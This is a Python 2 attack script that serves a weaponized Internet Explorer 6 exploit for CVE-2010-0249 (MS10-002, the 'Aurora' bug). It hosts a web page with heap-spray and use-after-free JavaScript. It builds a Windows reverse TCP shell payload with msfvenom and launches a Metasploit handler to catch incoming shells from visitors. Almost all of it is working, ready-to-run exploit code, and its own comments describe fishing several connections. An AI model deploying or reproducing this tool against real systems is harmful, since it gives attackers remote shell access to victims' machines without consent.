#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ####################################################################################
# █████╗ ██╗   ██╗██████╗  ██████╗ ██████╗  █████╗                                                          #
# ██╔══██╗██║   ██║██╔══██╗██╔═══██╗██╔══██╗██╔══██╗                                                        #
# ███████║██║   ██║██████╔╝██║   ██║██████╔╝███████║                                                        #
# ██╔══██║██║   ██║██╔══██╗██║   ██║██╔══██╗██╔══██║                                                        #
# ██║  ██║╚██████╔╝██║  ██║╚██████╔╝██║  ██║██║  ██║                                                        #
# ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝                                                        #
# aurora.py - nighter                                                                                       #
#                                                                                                           #
# DATE                                                                                                      #
# 08/11/2019                                                                                                #
#                                                                                                           #
# DESCRIPTION                                                                                               #
# This program acts as a web server that generates an exploit to                                            #
# target a vulnerability (CVE-2010-0249) MS10-002 in Internet Explorer.                                     #
# The exploit was tested using Internet Explorer 6 on Windows XP SP2.                                       #
#                                                                                                           #
# We weaponized the old exploit to make it more convinient                                                  #
#                                                                                                           #
# nighter - http://nighter.se/                                                                              #
#                                                                                                           #
#############################################################################################################

import os
import sys
import socket
import commands

from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
from multiprocessing import Process

class RequestHandler(BaseHTTPRequestHandler):

    def convert_to_utf16(self, payload):
        enc_payload = ''
        for i in range(0, len(payload), 2):
            num = 0
            for j in range(0, 2):
                num += (ord(payload[i + j]) & 0xff) << (j * 8)
            enc_payload += '%%u%04x' % num
        return enc_payload

    def get_exploit(self):
        exploit = '''
        <html>
        <head>
            <script>

            var obj, event_obj;

            function spray_heap()
            {
                var chunk_size, payload, nopsled;

                chunk_size = 0x80000;
                payload = unescape("<PAYLOAD>");
                nopsled = unescape("<NOP>");
                while (nopsled.length < chunk_size)
                    nopsled += nopsled;
                nopsled_len = chunk_size - (payload.length + 20);
                nopsled = nopsled.substring(0, nopsled_len);
                heap_chunks = new Array();
                for (var i = 0 ; i < 200 ; i++)
                    heap_chunks[i] = nopsled + payload;
            }

            function initialize()
            {
                obj = new Array();
                event_obj = null;
                for (var i = 0; i < 200 ; i++ )
                    obj[i] = document.createElement("COMMENT");
            }

            function ev1(evt)
            {
                event_obj = document.createEventObject(evt);
                document.getElementById("sp1").innerHTML = "";
                window.setInterval(ev2, 1);
            }

            function ev2()
            {
                var data, tmp;

                data = "";
                tmp = unescape("%u0a0a%u0a0a");
                for (var i = 0 ; i < 4 ; i++)
                    data += tmp;
                for (i = 0 ; i < obj.length ; i++ ) {
                    obj[i].data = data;
                }
                event_obj.srcElement;
            }

            function check()

		{
                document.write(navigator.userAgent);
                return true;
            }

            if (check()) {
                initialize();
                spray_heap();
            }
            else
                window.location = 'about:blank'

            </script>
        </head>
        <body>
		<h2> Hello </h2>
            <span id="sp1">
            <img src="aurora.gif" onload="ev1(event)">
            </span>
        </body>
        </html>
        '''
        exploit = exploit.replace('<PAYLOAD>', PAYLOAD)
        exploit = exploit.replace('<NOP>', '%u0a0a%u0a0a')
        return exploit

    def get_image(self):
        content = '\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff'
        content += '\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44'
        content += '\x01\x00\x3b'
        return content

    def log_request(self, *args, **kwargs):
        pass

    def do_GET(self):
        try:
            if self.path == '/':
                print
                print '[-] Incoming connection from %s' % self.client_address[0]
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                print '[-] Sending exploit to %s ...' % self.client_address[0]
                self.wfile.write(self.get_exploit())
                print '[-] Exploit sent to %s' % self.client_address[0]

            elif self.path == '/aurora.gif':
                self.send_response(200)
                self.send_header('Content-Type', 'image/gif')
                self.end_headers()
                self.wfile.write(self.get_image())

        except:
              print '[*] Error : an error has occured while serving the HTTP request'
              print '[-] Exiting ...'
              sys.exit(-1)


def build_payload():

   print("[+] Build payload")
   cmd = r"""msfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%s EXITFUNC=process -b "\x00" -f js_le 2>/dev/null""" % (LHOST, LPORT)
   payload = commands.getoutput(cmd)
   return payload


if __name__ == '__main__':

    if len(sys.argv) != 3:
        print ("""
 █████╗ ██╗   ██╗██████╗  ██████╗ ██████╗  █████╗ 
██╔══██╗██║   ██║██╔══██╗██╔═══██╗██╔══██╗██╔══██╗
███████║██║   ██║██████╔╝██║   ██║██████╔╝███████║
██╔══██║██║   ██║██╔══██╗██║   ██║██╔══██╗██╔══██║
██║  ██║╚██████╔╝██║  ██║╚██████╔╝██║  ██║██║  ██║
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
[Internet Explorer 6 on Windows XP SP2 - Aurora Exploit]                                                   
[nighter@nighter.se - (CVE-2010-0249)(MS10-002)]
               """)

        print("Usage: %s <LHOST> <LPORT>" % (sys.argv[0]))
        print("EXAMPLE: ./aurora.py '10.11.0.XXX' 1337\n")
        sys.exit(0)

    if os.path.isfile('/usr/bin/msfconsole') is False:
        print('[-] Please install metasploit for run this PoC.')
        sys.exit(1)

    LHOST = sys.argv[1]
    LPORT = sys.argv[2]
    PAYLOAD = build_payload()

    try:
        serv = HTTPServer(('', 1025), RequestHandler)
        print('[+] Web server is running at http://0.0.0.0:1025/')
        try:
            p = Process(target=serv.serve_forever)
            p.start()
        except:
            print('[-] Failed to run webserver exiting ...')
            os._exit(0)

    except socket.error:
        print('[*] Error : a socket could not bind to port 1025')
        os._exit(0)

    # Use multi/handler listener so we can fish several connections
    print("[+] Starting msf:multi/handler: %s" % LPORT)
    cmd = """msfconsole -q -x 'use exploit/multi/handler;set PAYLOAD windows/shell_reverse_tcp;set LHOST %s;set LPORT %s;run' 2>/dev/null""""" % (LHOST, LPORT)
    os.system(cmd)

